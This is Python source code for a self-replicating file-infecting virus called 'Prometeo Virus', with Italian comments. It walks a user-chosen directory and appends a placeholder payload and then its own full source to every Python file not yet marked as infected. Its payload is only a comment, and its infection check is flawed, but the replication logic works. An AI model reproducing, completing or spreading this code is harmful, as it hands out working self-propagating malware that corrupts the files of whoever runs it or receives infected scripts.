
# Importazioni necessarie

import os, sys, shutil, random, glob, time

viruskey = "#! My Virus Key: 1x2y3z"
infettato = "No"
banner = """
+-----------------+----------------+
| Prometeo Virus | Coded by Godlik |
+----------------+-----------------+
| Versione: 1.1  | Data: 8/1/2017  |
+----------------+-----------------+
	  """
myself = sys.argv[0]

#1 indentificazione

def identificazione():

	_path_ = os.getcwd() # ottengo la directory corrente
	for path, directory, files in os.walk(_path_): # ottengo tutte le directory, sottodirectory e files prsenti nella path
		for file in files:
			time.sleep(0.5)
			_file_, punto, estensione = file.partition('.') # Suddivide il file in tre parti separate dal punto, se dopo il punto
			if not file == myself: 
				if estensione == "py": # vi è py (estensione file python) il il file e' infettabile
					try:
						infettato = "No"
						fileopen = open(file, 'r') # Apri il file per leggerlo
						for line in fileopen: # Analizzo le righe			
							if viruskey in line: #Se trovi la key del virus il file e' infetto
								infettato = "Si"
								print("[*] File gia' infettato > " + file)
								break
						if infettato == "No": # Avvia infezione del file non infetto
							print("[+] Infetto il file... " + file)
							infezione_exploit(file)
					except FileNotFoundError:
						pass
				else:
					pass
			else: 
				pass
#2 Infezione

#exploit = """"""
def infezione_exploit(file):
	
	exploitstatus = "No" # Stato dell'Exploit negativo (vuol dire che non e' stato ancora iniettato)
	exploit =  "#" #'print("Exploited_)' # Questo è l'Exploit, e' possibile cambiarlo con altri
	print("\n[*] Preparo l'Exploit...")
	try:
		_file_ = open(file, 'a') # Apro il file
		_file_.write("\n" + exploit) # Inietto l'exploit nel file vittima "\n" + viruskey + 
		exploitstatus = "Si" # Stato dell' exploit positivo (exploit iniettato)
		_file_.close() # Chiudo il file
	except FileNotFoundError:
		pass
	if exploitstatus == "Si": # Se l'exploit è stato iniettato procendi con la Replicazione
		print("[+] Infezione Riuscita")
		print("[*] Mi copio nel file...")
		infezione_myself(file)
	else:
		pass

#3 Infezione (Inietto tutto il virus)

def infezione_myself(file):

	myself = sys.argv[0] # Il mio Virus
	myself = open(myself, 'r') # Apro il virus in modalita' read
	file = open(file, 'a') # Apro il file vittima in modalita' append
	for line in myself: # Per ogni righa nel mio virus 
		file.write(str(line)) # Scrivi nel file vittima quella linea 
	print("[+] File infettato Correttamente!")
	file.close() # Chiudo il file
	myself.close() #Chiudo il file

if __name__ == '__main__':
	
	print(banner) # Banner
	try:
		directory = input("Path >> ")
		os.chdir(directory) # Cambia directory in quella inserita
	except FileNotFoundError :
		print("[!] Path non Trovata")
		exit
	identificazione()
